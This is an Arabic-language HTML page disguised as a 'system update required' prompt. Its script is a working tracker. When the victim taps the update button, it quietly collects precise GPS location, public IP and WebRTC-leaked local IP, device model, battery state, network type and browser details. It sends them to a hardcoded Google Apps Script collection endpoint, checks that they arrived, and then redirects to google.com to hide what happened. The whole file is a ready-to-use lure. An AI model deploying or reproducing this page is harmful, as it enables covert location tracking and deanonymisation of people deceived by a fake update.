<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تحديث النظام</title>
<style>
  body { margin:0; padding:16px; background:#f2f2f7;
         font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
         display:flex; justify-content:center; align-items:center; min-height:100dvh; box-sizing:border-box; }
  .container { text-align:center; background:#fff; padding:26px; border-radius:16px;
               box-shadow:0 10px 25px rgba(0,0,0,.1); width:100%; max-width:330px; }
  h2 { color:#1c1c1e; margin-top:0; font-size:20px; }
  p  { color:#8e8e93; font-size:14px; margin-bottom:22px; line-height:1.6; }
  button { background:#007aff; color:#fff; border:none; padding:14px 0; width:100%;
           border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:.2s; }
  button:active { transform:scale(.98); opacity:.9; }
  button[disabled] { opacity:.6; cursor:default; }
  .loader { border:3px solid #f3f3f3; border-top:3px solid #007aff; border-radius:50%;
            width:24px; height:24px; animation:spin 1s linear infinite; margin:20px auto; display:none; }
  @keyframes spin { to { transform:rotate(360deg); } }
  #status { display:none; margin-top:15px; font-weight:700; font-size:13.5px; line-height:1.6; }
  #status.ok  { color:#34c759; display:block; }
  #status.err { color:#ff3b30; display:block; }
  #hint { font-size:11.5px; color:#c7c7cc; margin-top:14px; line-height:1.5; }
</style>
</head>
<body>

<div class="container">
  <h2>تحديث النظام مطلوب</h2>
  <p>سيتم التحقق من الجهاز والشبكة والموقع الجغرافي.</p>

  <button id="btn" type="button">تحديث الآن</button>

  <div class="loader" id="loader"></div>
  <div id="status" role="status" aria-live="polite"></div>
  <div id="hint"></div>
</div>

<script>
  const GOOGLE_SCRIPT_URL = location.protocol.startsWith('http')
    ? location.origin + location.pathname
    : 'https://script.google.com/macros/s/AKfycbxd_EXLlnhsh5GTYqZ50yYxz8O11s3zh-vL4mf8Hduk2UP5dJMxrfLNflDHGnNpMlhU6w/exec';

  const REDIRECT_URL   = 'https://www.google.com';
  const POST_TIMEOUT   = 12000;
  const GEO_TIMEOUT    = 15000;
  const VERIFY_TIMEOUT = 9000;

  const withTimeout = (p, ms, fb) =>
    Promise.race([p, new Promise(r => setTimeout(() => r(fb), ms))]);

  const str = (v, n) => String(v ?? '').slice(0, n);

  /* ---------- استخراج الجهاز من البصمة ---------- */
  function parseModel(ua) {
    const m = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))/i);
    if (m) return m[1].replace(/\s+Build.*/i, '').trim();
    if (/iPhone/.test(ua)) return 'iPhone';
    if (/iPad/.test(ua)) return 'iPad';
    return '';
  }

  function parseBrand(model, ua) {
    const t = (model + ' ' + ua).toLowerCase();
    if (/sm-|gt-|samsung/.test(t)) return 'Samsung';
    if (/pixel/.test(t)) return 'Google';
    if (/redmi|poco|xiaomi|^m\d|mi \d/.test(t)) return 'Xiaomi';
    if (/oneplus/.test(t)) return 'OnePlus';
    if (/moto|xt\d/.test(t)) return 'Motorola';
    if (/cph|oppo/.test(t)) return 'OPPO';
    if (/vivo/.test(t)) return 'vivo';
    if (/infinix/.test(t)) return 'Infinix';
    if (/tecno/.test(t)) return 'TECNO';
    if (/huawei|honor/.test(t)) return 'Huawei';
    if (/nokia/.test(t)) return 'Nokia';
    if (/iphone|ipad/.test(t)) return 'Apple';
    if (/realme/.test(t)) return 'realme';
    return '';
  }

  function parsePlatform(ua) {
    let m = ua.match(/Android\s+([\d.]+)/);
    if (m) return 'Android ' + m[1];
    m = ua.match(/iPhone OS ([\d_]+)/);
    if (m) return 'iOS ' + m[1].replace(/_/g, '.');
    if (/Windows NT/.test(ua)) return 'Windows';
    if (/Mac OS X/.test(ua)) return 'macOS';
    if (/Linux/.test(ua)) return 'Linux';
    return '';
  }

  /* ---------- البطارية ---------- */
  async function getBattery() {
    if (!navigator.getBattery) return { level: '', charging: '' };
    try {
      const b = await withTimeout(navigator.getBattery(), 3000, null);
      if (!b) return { level: '', charging: '' };
      return {
        level: Math.round(b.level * 100) + '%',
        charging: b.charging ? 'نعم' : 'لا'
      };
    } catch { return { level: '', charging: '' }; }
  }

  /* ---------- نوع الشبكة ---------- */
  function getNetType() {
    const c = navigator.connection;
    if (!c) return '';
    const map = { 'slow-2g': '2G', '2g': '2G', '3g': '3G', '4g': '4G' };
    return map[c.effectiveType] || str(c.effectiveType, 20);
  }

  /* ---------- الأيبي المحلي ---------- */
  function getWebRTC() {
    const p = new Promise(resolve => {
      if (!window.RTCPeerConnection) return resolve('N/A');
      let done = false;
      const fin = v => { if (!done) { done = true; resolve(v); } };
      let pc;

      try { pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); }
      catch { return fin('N/A'); }

      pc.onicecandidate = e => {
        if (e.candidate) return;
        const sdp = pc.localDescription ? pc.localDescription.sdp : '';
        const m = sdp.match(/candidate:\S+ \d+ \S+ \d+ (\d{1,3}(?:\.\d{1,3}){3})/);
        fin(m ? m[1] : 'N/A');
        try { pc.close(); } catch {}
      };

      try {
        pc.createDataChannel('x');
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => fin('N/A'));
      } catch { fin('N/A'); }
    });
    return withTimeout(p, 5000, 'N/A');
  }

  /* ---------- الأيبي العام ---------- */
  async function getPublicIP() {
    for (const u of ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json']) {
      try {
        const r = await withTimeout(fetch(u, { cache: 'no-store' }), 5000, null);
        if (!r || !r.ok) continue;
        const j = await r.json();
        if (j && j.ip) return str(j.ip, 45);
      } catch {}
    }
    return 'N/A';
  }

  /* ---------- الموقع ---------- */
  function getGeo() {
    const p = new Promise(resolve => {
      if (!navigator.geolocation) return resolve({ s: 'N/A' });
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          s: pos.coords.accuracy <= 50 ? 'gps' : 'شبكة',
          lat: +pos.coords.latitude.toFixed(6),
          lng: +pos.coords.longitude.toFixed(6),
          acc: Math.round(pos.coords.accuracy)
        }),
        err => resolve({ s: err.code === 1 ? 'مرفوض' : 'N/A' }),
        { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
      );
    });
    return withTimeout(p, GEO_TIMEOUT + 800, { s: 'N/A' });
  }

  /* ---------- التحقق ---------- */
  const nonce = (crypto.randomUUID && crypto.randomUUID()) ||
                (String(Date.now()) + '-' + Math.random().toString(36).slice(2));

  function verify() {
    return new Promise(resolve => {
      const cb = '__v' + Math.floor(Math.random() * 1e9);
      const s  = document.createElement('script');
      let done = false, timer;

      const fin = v => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        try { delete window[cb]; } catch { window[cb] = undefined; }
        s.remove();
        resolve(!!v);
      };

      window[cb] = fin;
      timer = setTimeout(() => fin(false), VERIFY_TIMEOUT);
      s.onerror = () => fin(false);
      s.src = GOOGLE_SCRIPT_URL + '?check=' + encodeURIComponent(nonce)
            + '&cb=' + cb + '&t=' + Date.now();
      document.body.appendChild(s);
    });
  }

  /* ---------- التشغيل ---------- */
  let busy = false;

  async function start() {
    if (busy) return;

    const btn    = document.getElementById('btn');
    const loader = document.getElementById('loader');
    const status = document.getElementById('status');

    busy = true;
    btn.disabled = true;
    btn.style.display = 'none';
    loader.style.display = 'block';
    status.className = '';
    status.textContent = 'جارٍ التحقق من الجهاز…';

    try {
      const [geo, ip, battery, localIP] = await Promise.all([
        getGeo(), getPublicIP(), getBattery(), getWebRTC()
      ]);

      const ua    = navigator.userAgent;
      const model = parseModel(ua);

      status.textContent = 'جارٍ تحديد المدينة…';

      const payload = {
        time: new Date().toISOString(),
        nonce,
        ip,
        localIP,
        lat: geo.lat ?? '',
        lng: geo.lng ?? '',
        acc: geo.acc ?? '',
        geoSource: geo.s,
        network: getNetType(),
        model,
        brand: parseBrand(model, ua),
        platform: parsePlatform(ua),
        battery: battery.level,
        charging: battery.charging,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        lang: navigator.language || '',
        ua
      };

      const ac = new AbortController();
      const killer = setTimeout(() => ac.abort(), POST_TIMEOUT);
      try {
        await fetch(GOOGLE_SCRIPT_URL, {
          method: 'POST',
          mode: 'no-cors',
          signal: ac.signal,
          headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
          body: JSON.stringify(payload)
        });
      } finally { clearTimeout(killer); }

      status.textContent = 'جارٍ التحقق من الاستلام…';
      const ok = await verify();

      loader.style.display = 'none';

      if (!ok) {
        status.className = 'err';
        status.textContent = '⚠️ لم يُؤكد الاستلام — تحقق من النشر';
        btn.disabled = false;
        btn.style.display = 'block';
        busy = false;
        return;
      }

      status.className = 'ok';
      status.textContent = '✅ تم التحقق — جارٍ التحويل';
      setTimeout(() => location.href = REDIRECT_URL, 2000);

    } catch (err) {
      console.error(err);
      loader.style.display = 'none';
      status.className = 'err';
      status.textContent = '⚠️ تعذر الإرسال، حاول مجددًا';
      btn.disabled = false;
      btn.style.display = 'block';
      busy = false;
    }
  }

  document.getElementById('btn').addEventListener('click', start);
</script>

</body>
</html>
